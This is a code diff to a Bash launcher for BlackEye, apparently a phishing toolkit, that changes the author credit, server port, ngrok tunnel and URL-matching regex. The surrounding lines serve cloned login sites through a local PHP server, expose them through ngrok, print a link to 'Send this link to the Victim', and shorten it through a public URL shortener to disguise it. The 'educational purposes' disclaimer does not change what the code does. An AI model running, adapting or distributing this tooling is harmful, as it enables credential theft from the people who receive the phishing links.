@@ -212,7 +212,7 @@ printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and ar
 printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
 printf "\n"
-printf "     \e[101m\e[1;77m::     BLACKEYE-IM! By @Git-Ankitraj & @thelinuxchoice     ::\e[0m\n"
+printf "     \e[101m\e[1;77m::     BLACKEYE-IM! By @The-Burning                          ::\e[0m\n"
 printf "\n"
 }
 
@@ -422,13 +422,13 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 short_link=`wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=$link\&keyword=$2`
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
